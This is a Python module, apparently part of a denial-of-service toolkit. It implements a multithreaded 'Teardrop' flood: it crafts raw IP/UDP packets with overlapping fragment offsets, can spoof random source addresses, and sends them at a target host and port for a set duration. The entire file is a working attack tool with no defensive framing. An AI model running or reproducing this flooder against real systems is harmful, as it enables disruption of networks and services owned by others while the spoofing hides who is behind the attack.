import socket
import struct
import random
import threading
import time
from core.ip_spoof import random_ip  # pastikan core/ip_spoof.py tersedia

class TeardropFlood:
    def __init__(self, target, port, threads, duration, spoof=False):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.spoof = spoof
        self.stop_event = threading.Event()

    def _checksum(self, data):
        if len(data) % 2 == 1:
            data += b'\x00'
        s = sum(struct.unpack('!%dH' % (len(data)//2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff

    def _build_fragment(self, src_ip, dst_ip, offset, more_frag):
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 20 + 8
        ip_id = random.randint(1, 65535)
        ip_frag_off = (offset // 8) | (0x2000 if more_frag else 0)
        ip_ttl = 255
        ip_proto = socket.IPPROTO_UDP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(dst_ip)

        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                ip_ihl_ver, ip_tos, ip_tot_len, ip_id,
                                ip_frag_off, ip_ttl, ip_proto, ip_check,
                                ip_saddr, ip_daddr)
        ip_check = self._checksum(ip_header)
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                ip_ihl_ver, ip_tos, ip_tot_len, ip_id,
                                ip_frag_off, ip_ttl, ip_proto, ip_check,
                                ip_saddr, ip_daddr)
        # UDP header (partial)
        udp_header = struct.pack('!HHHH', random.randint(1024,65535), self.port, 8, 0)
        return ip_header, udp_header

    def _attack(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except Exception:
            return

        while not self.stop_event.is_set():
            src = self.target if not self.spoof else random_ip()
            dst = self.target
            # First fragment with offset 0, more fragments
            ip1, udp1 = self._build_fragment(src, dst, 0, True)
            # Second fragment with overlapping offset (offset 8, but same total length leads to overlap)
            ip2, udp2 = self._build_fragment(src, dst, 8, False)
            packet1 = ip1 + udp1
            packet2 = ip2 + udp2
            try:
                sock.sendto(packet1, (dst, self.port))
                sock.sendto(packet2, (dst, self.port))
            except Exception:
                pass

    def start(self):
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._attack)
            t.daemon = True
            t.start()
            threads.append(t)
        time.sleep(self.duration)
        self.stop_event.set()
        for t in threads:
            t.join(timeout=1)

def attack(target, port, threads, duration, spoof=False):
    flood = TeardropFlood(target, port, threads, duration, spoof)
    flood.start()
